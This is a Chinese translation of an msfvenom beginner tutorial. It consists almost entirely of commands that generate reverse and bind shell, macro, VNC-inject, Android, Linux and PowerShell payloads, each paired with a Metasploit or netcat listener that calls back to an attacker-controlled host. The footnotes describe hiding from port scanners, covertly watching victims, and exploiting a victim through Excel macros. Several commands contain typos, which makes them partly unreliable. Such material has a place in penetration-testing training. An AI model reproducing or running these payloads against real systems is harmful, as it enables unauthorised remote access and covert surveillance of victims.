## Msfvenom初学者教程 [^1]

### **绑定shell **[^2]

`msfvenom -p windows/meterpreter/bind_tcp -f exe > /root/Desktop/bind.exe`

```bash
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/bind_tcp
msf exploit(handler) > set rhost 192.168.0.100
msf exploit(handler) > set lport 4444
msf exploit(handler) > exploit
```

### **反向TCP有效负载** [^3]

`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.107 lport=5555 -f exe > / root/Desktop/reverse_tcp.exe`

```bash
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.0.107
msf exploit(handler) > set lport 5555
msf exploit(handler) > exploit
```

### **HTTPS有效负载 ** [^4]

`msfvenom -p windows/meterpreter/reverse_https lhost=192.168.0.107 lport=443 -f exe > /root/Desktop/443.exe`

```bash
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_https
msf exploit(handler) > set lhost 192.168.0.107
msf exploit(handler) > set lport 443
msf exploit(handler) > exploit
```

### **隐藏绑定TCP有效负载** [^5]

`msfvenom -p windows/shell_hidden_bind_tcp ahost=192.168.0.107 lport=1010 -f exe > /root/Desktop/hidden.exe`

`nc 192.168.0.100 1010`

### **使用Netcat反向Shell有效负载** [^6]

`msfvenom -p windows/shell_reverse_tcp ahost=192.168.0.107 lport=1111-f exe > /root/Desktop/ncshell.exe`

`nc -lvp 1111`

### **宏有效负载** [^7]

`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.107 lport=7777 -f vba`

```bash
msf > use exploit/multi/handler
msf exploit(handler) > set paylaod windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.0.107
msf exploit(handler) > set lport 7777
msf exploit(handler) > exploit
```

### **VNC有效载荷** [^8]

`msfvenom -p windows/vncinject/reverse_tcp lhost=192.168.0.107 lport=5900 -f exe > /root/Desktop/vnc.exe`

```bash
msf exploit(handler) > use exploit/multi/handler
msf exploit(handler) > set paylaod windows/vncinject/reverse_tcp
msf exploit(handler) > set lhost 192.168.0.107
msf exploit(handler) > set lport= 5900
msf exploit(handler) > exploit
```

### **Android Payload**

`msfvenom -p andriod/meterpreter/reverse_tcp lhost=192.168.0.107 lport=8888 > /root/Desktop/file.apk`

```bash
msf > use exploit/multi/handler
msf exploit(handler) > set payload android/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.0.107
msf exploit(handler) > set lport 8888
msf exploit(handler) > exploit
```

### **Linux Payload**

`msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f elf > /root/Desktop/shell`

```bash
msf > use exploit/multi/handler
msf exploit(handler) > set payload linux/x86/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.0.107
msf exploit(handler) > set lhost 4444
msf exploit(handler) > run
```

### **Powershell Payload**

`msfvenom -p cmd/windows/reverse_powershell lhost=192.168.0.107 lport=4444 > /root/Desktop/shell.bat`

```bash
msf > use multi/handler
msf exploit(handler) > set payload cmd/windows/reverse_powershell
msf exploit(handler) > set lhost 192.168.0.107
msf exploit(handler) > set lport 4444
msf exploit(handler) > run
```

[原文](https://www.hackingarticles.in/msfvenom-tutorials-beginners/)

---

[^1]: Msfvenom是Metasploit的命令行实例，用于生成和输出Metasploit中提供的所有各种类型的shell代码,即创建具有不同扩展和技术的有效载荷。
[^2]: 绑定shell是一种在目标计算机上打开新服务并要求攻击者连接到它以获得会话的类型
[^3]: 反向shell（也称为连接反向）正好相反：它要求攻击者首先在他的盒子上设置一个侦听器，目标机器充当连接到该侦听器的客户端，然后最终攻击者接收到shell
[^4]: 如果我们在受害计算机上有相关端口处于活动状态，则可以使用上述两个有效负载，因此问题出现了如果受害者已阻止所有端口的情况？那么在这种情况下，我们可以根据受害机器上运行的端口创建有效负载，例如443 for https
[^5]: 这个有效负载在执行时以静默方式隐藏在后台，如果被任何端口扫描程序扫描，则不会显示其存在
[^6]: 现在让我们做同样的过程并使用shell_reverse_tcp有效载荷，这是另一种获取受害者shell会话的技术
[^8]: 如果我们能够在他们不知情的情况下远离受害者机器并匿名观察他们的活动，这种有效载荷就是这样，那么我们就可以利用它来实现我们的利益。
[^7]: 我们使用VBA脚本创建一个有效负载，我们将使用它在Excel上创建一个宏来利用受害者机器。